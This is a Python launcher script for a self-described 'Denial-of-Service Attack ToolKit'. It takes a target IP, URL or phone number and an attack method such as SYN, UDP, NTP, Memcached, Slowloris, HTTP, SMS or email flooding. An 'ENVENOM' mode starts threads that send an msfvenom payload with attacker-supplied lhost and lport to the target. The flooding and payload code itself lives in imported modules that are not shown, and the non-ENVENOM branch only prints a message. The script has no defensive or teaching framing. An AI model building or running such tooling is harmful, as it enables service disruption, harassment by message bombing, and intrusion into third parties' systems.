#!/usr/bin/python3
import os
import sys
import argparse
import threading

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
    from tools.L4.envenom import main as envenom_main
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

parser = argparse.ArgumentParser(description="Denial-of-Service Attack ToolKit")
parser.add_argument("--target", type=str, metavar="<IP:PORT, URL, PHONE>", help="Target IP:port, url or phone")
parser.add_argument("--method", type=str, metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/ENVENOM>", help="Attack method")
parser.add_argument("--time", type=int, default=10, metavar="<time>", help="time in seconds")
parser.add_argument("--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)")

# Add envenom-specific argument parser
envenom_parser = parser.add_argument_group("Envenom Options")
envenom_parser.add_argument("--payload", type=str, help='Payload for msfvenom')
envenom_parser.add_argument("--lhost", type=str, help='Local host for msfvenom payload')
envenom_parser.add_argument("--lport", type=int, help='Local port for msfvenom payload')
envenom_parser.add_argument("--num_packets", type=int, default=100, help='Number of packets to send')
envenom_parser.add_argument("--burst_interval", type=float, default=0.1, help='Interval between packets in seconds')

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if not method or not target or not time:
    parser.print_help()
    sys.exit(1)

# Check for ENVENOM method and validate required arguments
if method == "ENVENOM":
    if not args.payload or not args.lhost or not args.lport:
        print("Error: --payload, --lhost, and --lport are required for the ENVENOM method.")
        parser.print_help()
        sys.exit(1)

    def envenom_attack():
        envenom_main(target, args.payload, args.lhost, args.lport, time)

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=envenom_attack)
        t.daemon = True
        threads_list.append(t)
        t.start()
else:
    # Handle other methods (e.g., UDP) without requiring envenom-specific arguments
    print(f"Running attack with method: {method} on target: {target} for {time} seconds with {threads} threads.")
    # Add logic for other attack methods here